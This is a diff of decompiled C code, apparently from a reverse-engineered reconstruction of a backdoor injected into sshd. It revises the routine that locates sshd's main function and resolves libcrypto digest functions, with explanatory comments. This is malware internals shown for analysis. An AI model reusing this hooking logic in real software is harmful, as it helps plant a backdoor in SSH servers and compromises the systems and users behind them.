@@ -52,7 +52,7 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
     }
     libc_start_main_got = (u8 *)elf_get_got_symbol(sshd,STR_libc_start_main);
     if (((libc_start_main_got != (u8 *)0x0) &&
-        (code_start = sshd->elfbase->e_ident + sshd->elfbase->e_entry, code_start < code_segment_end)) &&
+        (code_start = (u8 *)sshd->elfbase + sshd->elfbase->e_entry, code_start < code_segment_end)) &&
        (code_segment_start <= code_start)) {
       ctx_cursor = &insn_ctx;
       clear_idx = 0x16;
@@ -64,7 +64,7 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
       // AutoDoc: Zero the disassembler context before scanning so every entry stub starts from a clean slate.
       for (; clear_idx != 0; clear_idx = clear_idx + -1) {
         *(u32 *)&ctx_cursor->instruction = 0;
-        ctx_cursor = (dasm_ctx_t *)((long)ctx_cursor + (ulong)zero_seed * -8 + 4);
+        ctx_cursor = (dasm_ctx_t *)((u8 *)ctx_cursor + 4);
       }
       // AutoDoc: Preload EVP_Digest before decoding so the import table is ready as soon as the entry point is confirmed.
       symbol_entry = elf_symbol_get(libcrypto,STR_EVP_Digest,0);
@@ -72,7 +72,7 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
         symbol_value = symbol_entry->st_value;
         libcrypto_ehdr = libcrypto->elfbase;
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
-        imported_funcs->EVP_Digest = (pfn_EVP_Digest_t)(libcrypto_ehdr->e_ident + symbol_value);
+        imported_funcs->EVP_Digest = (pfn_EVP_Digest_t)((u8 *)libcrypto_ehdr + symbol_value);
       }
       sshd_main_candidate = (u8 *)0x0;
       while (code_start < code_end) {
@@ -99,7 +99,7 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
             symbol_entry = elf_symbol_get(libcrypto,STR_EVP_sha256,0);
             if (symbol_entry != (Elf64_Sym *)0x0) {
               imported_funcs->EVP_sha256 =
-                   (pfn_EVP_sha256_t)(libcrypto->elfbase->e_ident + symbol_entry->st_value);
+                   (pfn_EVP_sha256_t)((u8 *)libcrypto->elfbase + symbol_entry->st_value);
               imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
             }
             *code_start_out = sshd_main_candidate;
